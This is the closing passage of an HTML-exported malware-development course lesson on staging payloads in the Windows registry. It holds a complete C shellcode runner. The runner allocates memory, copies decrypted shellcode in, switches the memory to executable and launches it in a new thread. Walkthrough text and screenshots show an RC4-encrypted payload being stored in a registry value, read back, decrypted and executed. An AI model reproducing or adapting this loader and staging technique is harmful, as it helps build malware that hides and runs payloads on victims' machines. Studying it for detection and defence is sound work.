</code></pre><h3 id="9b31674b-0b8b-4791-9c77-98baeb6ba174" class=""><strong>Executing Payload</strong></h3><p id="62910cfd-dee2-405e-af79-ed5d2dbbf5d5" class="">Once the payload is read from the registry and stored inside the allocated buffer, the <code>RunShellcode</code> function is used to execute the payload. Note that this function was explained in earlier modules.</p><pre id="49a248cc-4a8f-41eb-ac4e-aaa7473af40c" class="code code-wrap"><code>
BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {

    PVOID pShellcodeAddress = NULL;
    DWORD dwOldProtection   = NULL;

    pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf(&quot;[!] VirtualAlloc Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    printf(&quot;[i] Allocated Memory At : 0x%p \n&quot;, pShellcodeAddress);

    memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
    memset(pDecryptedShellcode, &#x27;\0&#x27;, sDecryptedShellcodeSize);

    if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;[!] VirtualProtect Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    printf(&quot;[#] Press &lt;Enter&gt; To Run ... &quot;);
    getchar();

    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf(&quot;[!] CreateThread Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    return TRUE;
}

</code></pre><h3 id="d86e7781-9e38-48f3-a76d-0efc8afc3829" class=""><strong>Writing To The Registry - Demo</strong></h3><p id="ab40fe57-5a41-4006-a277-c24b08c5eb9a" class="">Before executing the compiled code shown above, the registry key looks like this:</p><figure id="b3c9fb21-41b4-4505-98d5-350bd44b7fdc" class="image"><a href="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-demo-1.png"><img style="width:1067px" src="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-demo-1.png"/></a></figure><p id="90452c8d-a80d-4cfc-8c4e-3c48bcc04797" class="">After running the program, a new registry string value is created with the RC4 encrypted payload.</p><figure id="b0ad631c-3362-4c95-8f93-9096e5720d4a" class="image"><a href="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-demo-2.png"><img style="width:1265px" src="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-demo-2.png"/></a></figure><p id="a01b3ba5-f335-4752-a38d-cc26cc2f67ad" class="">Double-clicking on <code>MaldevAcademy</code> will show the payload in HEX and ASCII format.</p><figure id="d98833d1-d0c5-442e-af8e-e58a3c03f55b" class="image"><a href="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-demo-3.png"><img style="width:957px" src="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-demo-3.png"/></a></figure><h3 id="be952a46-b7cb-4044-9397-d0d701bfffb6" class=""><strong>Reading The Registry - Demo</strong></h3><p id="82288064-ab06-4101-aa4b-79d6e93ee84e" class="">The program begins by reading the encrypted payload from the Registry.</p><figure id="a865108b-70ad-4e5d-aa31-a5bce092f34b" class="image"><a href="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-read-demo-1.png"><img style="width:1385px" src="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-read-demo-1.png"/></a></figure><p id="12917b71-04f3-4fc9-a530-a30157f9af50" class="">Next, the program will decrypt the payload.</p><figure id="a87aa5b2-7e3d-4348-b600-0f7cb60e93d6" class="image"><a href="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-read-demo-2.png"><img style="width:1249px" src="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-read-demo-2.png"/></a></figure><p id="235ae167-fe0a-4b66-80c3-ab5127a011fb" class="">Finally, the decrypted payload is executed.</p><figure id="0d45d15f-b10d-458c-be4b-82853058f869" class="image"><a href="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-read-demo-3.png"><img style="width:1715px" src="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-read-demo-3.png"/></a></figure></div></article></body></html>